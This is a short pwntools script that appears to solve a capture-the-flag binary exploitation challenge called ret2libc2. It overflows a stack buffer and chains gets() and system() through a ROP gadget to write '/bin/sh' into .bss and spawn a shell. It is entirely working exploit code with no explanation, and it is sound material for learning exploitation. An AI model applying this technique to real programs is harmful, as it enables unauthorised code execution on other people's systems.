#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')
shelf = ELF('./ret2libc2')

gets_plt = shelf.plt['gets']
system_plt = shelf.plt['system']

# ROPgadget --binary ret2libc2 --only 'pop|ret'
# 0x0804872e : pop edi ; pop ebp ; ret
pop_edi_ebp_ret = 0x0804872e
# objdump -x ./ret2libc2 |grep .bss
buf2 = 0x0804a080

payload = flat(['a' * 112, gets_plt, pop_edi_ebp_ret, buf2, 0xdeadbeef, system_plt, 0xdeadbeef, buf2])

sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
